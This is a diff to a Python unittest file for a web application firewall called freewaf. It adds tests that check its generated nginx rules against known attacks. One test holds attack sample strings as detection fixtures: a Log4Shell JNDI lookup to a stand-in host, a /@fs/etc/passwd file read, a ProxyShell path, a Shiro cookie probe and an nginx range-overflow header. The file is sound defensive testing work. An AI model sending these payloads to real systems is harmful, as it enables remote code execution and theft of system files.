@@ -10,7 +10,7 @@ from unittest import mock
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
 
-from freewaf.defaults import BUILTIN_RULES, DEFAULT_SETTINGS, VERIFIED_AI_BOT_PROVIDERS, VERIFIED_BOT_PROVIDERS
+from freewaf.defaults import BUILTIN_RULES, DEFAULT_SETTINGS, SAFELINE_COMPATIBILITY_RULES, VERIFIED_AI_BOT_PROVIDERS, VERIFIED_BOT_PROVIDERS
 from freewaf.nginx import generate_nginx_config, parse_nginx_logs, write_nginx_config
 
 
@@ -183,6 +183,28 @@ class NginxGeneratorTests(unittest.TestCase):
         self.assertIn("if ($request_uri ~*", config)
         self.assertNotIn("$request_method$request_uri", config)
 
+    def test_header_rules_inspect_operational_security_headers(self):
+        config = generate_nginx_config(
+            make_state(
+                rules=[
+                    {
+                        "id": "header-test",
+                        "name": "Header test",
+                        "enabled": True,
+                        "siteId": "*",
+                        "matcher": "regex",
+                        "target": "headers",
+                        "pattern": "probe",
+                        "action": "block",
+                    }
+                ]
+            )
+        )
+
+        self.assertIn("if ($http_cookie ~*", config)
+        self.assertIn("if ($http_range ~*", config)
+        self.assertIn("if ($http_accept_language ~*", config)
+
     def test_application_builtin_rules_are_nginx_native(self):
         app_rule_ids = {
             "builtin-wordpress-sensitive-files",
@@ -211,6 +233,30 @@ class NginxGeneratorTests(unittest.TestCase):
         self.assertIn("[Laravel] Env, logs, and framework internals", config)
         self.assertIn("[CodeIgniter] Protected framework paths", config)
         self.assertIn("[HostBill] Sensitive files and directories", config)
+
+    def test_safeline_compatibility_rules_are_native_and_valid(self):
+        ids = [rule["id"] for rule in SAFELINE_COMPATIBILITY_RULES]
+        rules = {rule["id"]: rule for rule in SAFELINE_COMPATIBILITY_RULES}
+
+        self.assertGreaterEqual(len(SAFELINE_COMPATIBILITY_RULES), 190)
+        self.assertEqual(len(ids), len(set(ids)))
+        for rule in SAFELINE_COMPATIBILITY_RULES:
+            self.assertNotEqual(rule["target"], "body")
+            re.compile(rule["pattern"], re.IGNORECASE)
+
+        samples = {
+            "builtin-safeline-131094": "${jndi:ldap://attacker.test/a}",
+            "builtin-safeline-65882": "/@fs/etc/passwd?raw",
+            "builtin-safeline-65751": "/autodiscover/autodiscover.json?@x/PowerShell/",
+            "builtin-safeline-65606": "rememberMe=deleteMe",
+            "builtin-safeline-65585": "bytes=0-,-",
+        }
+        for rule_id, sample in samples.items():
+            self.assertRegex(sample, rules[rule_id]["pattern"])
+
+        config = generate_nginx_config(make_state())
+        self.assertIn("[SafeLine 65641] Apache Log4j remote execution vulnerability", config)
+        self.assertIn("[SafeLine 65585] Nginx range filter overflow (CVE-2017-7529)", config)
 
     def test_monitor_site_does_not_block_matching_rules(self):
         state = make_state(
